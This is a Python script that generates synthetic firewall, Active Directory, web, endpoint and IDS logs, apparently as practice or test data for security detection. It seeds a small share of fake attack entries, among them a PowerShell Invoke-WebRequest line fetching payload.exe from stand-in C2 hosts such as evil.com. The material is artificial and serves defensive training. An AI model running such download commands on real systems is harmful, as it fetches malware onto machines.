import random
import datetime
from faker import Faker
import numpy as np

fake = Faker()

# ===== CONFIGURATION =====
NUM_LOGS = 5000  # Nombre total de logs par composant
ATTACKER_IPS = ["45.33.12.8", "185.143.223.11", "91.234.56.78"]
PHISHING_URLS = ["malicious-site.com", "phishing-attempt.net", "fake-login.xyz"]
MAL_FILE_HASHES = ["a1b2c3d4e5f6", "b5e7f8a9c0d3", "f4e3d2c1b0a9"]
C2_SERVERS = ["evil.com", "c2-malware.org", "exfiltration.xyz"]
USERNAMES = [fake.user_name() for _ in range(20)]  # 20 utilisateurs réalistes

# ===== FONCTIONS DE GÉNÉRATION =====
def generate_timestamp(base_time=None, spread_minutes=1440):
    """Génère un timestamp aléatoire dans une plage donnée."""
    if not base_time:
        base_time = datetime.datetime.now()
    random_minutes = random.randint(0, spread_minutes)
    return base_time - datetime.timedelta(minutes=random_minutes)

def generate_fw_logs():
    logs = []
    for _ in range(NUM_LOGS):
        time = generate_timestamp()
        if random.random() < 0.01:  # 1% de logs malveillants
            log = f"[{time}] BLOCK TCP {random.choice(ATTACKER_IPS)}:80 → 192.168.1.{random.randint(1, 100)}:{random.randint(1000, 9999)} (Phishing URL: {random.choice(PHISHING_URLS)})"
        else:
            log = f"[{time}] ALLOW TCP {fake.ipv4()}:{random.randint(1000, 9999)} → 10.0.0.{random.randint(1, 10)}:443 (User: {random.choice(USERNAMES)})"
        logs.append(log)
    
    with open("fw_logs.txt", "w") as f:
        f.write("\n".join(logs))

def generate_ad_logs():
    logs = []
    for _ in range(NUM_LOGS):
        time = generate_timestamp()
        user = random.choice(USERNAMES)
        if random.random() < 0.02:  # 2% de logs malveillants
            if random.random() < 0.7:
                log = f"[{time}] FAILED Login User: {user} (Workstation: WS-00{random.randint(1, 5)})"
            else:
                log = f"[{time}] SUCCESS Login User: {user} (After {random.randint(3, 10)} attempts)"
        else:
            log = f"[{time}] SUCCESS Login User: {user} (Workstation: WS-00{random.randint(1, 5)})"
        logs.append(log)
    
    with open("ad_logs.txt", "w") as f:
        f.write("\n".join(logs))

def generate_web_logs():
    logs = []
    for _ in range(NUM_LOGS):
        time = generate_timestamp()
        if random.random() < 0.01:  # 1% de logs malveillants
            log = f"[{time}] GET /phishing-page 200 (Referer: {random.choice(PHISHING_URLS)})"
        else:
            log = f"[{time}] GET /home 200 (User-Agent: {fake.user_agent()})"
        logs.append(log)
    
    with open("web_app_logs.txt", "w") as f:
        f.write("\n".join(logs))

def generate_endpoint_logs():
    logs = []
    for _ in range(NUM_LOGS):
        time = generate_timestamp()
        if random.random() < 0.01:  # 1% de logs malveillants
            log = f"[{time}] PROCESS_START: powershell.exe (Command: \"Invoke-WebRequest -Uri {random.choice(C2_SERVERS)}/payload.exe\")"
        else:
            log = f"[{time}] PROCESS_START: {fake.file_name(extension='exe')} (User: {random.choice(USERNAMES)})"
        logs.append(log)
    
    with open("endpoint_logs.txt", "w") as f:
        f.write("\n".join(logs))

def generate_ids_logs():
    logs = []
    for _ in range(NUM_LOGS):
        time = generate_timestamp()
        if random.random() < 0.01:  # 1% d'alertes IDS
            attack_type = random.choice(["SQL Injection", "Brute Force", "Phishing Attempt", "C2 Beacon"])
            log = f"[{time}] ALERT {attack_type} Detected (Source: {random.choice(ATTACKER_IPS)}, Target: 192.168.1.{random.randint(1, 100)})"
        else:
            log = f"[{time}] INFO Traffic Scan Completed (Protocol: {random.choice(['TCP', 'UDP'])})"
        logs.append(log)
    
    with open("ids_logs.txt", "w") as f:
        f.write("\n".join(logs))

# ===== EXÉCUTION =====
if __name__ == "__main__":
    print("Génération des logs en cours...")
    generate_fw_logs()
    generate_ad_logs()
    generate_web_logs()
    generate_endpoint_logs()
    generate_ids_logs()
    print(f"Génération terminée : {NUM_LOGS} logs par composant.")
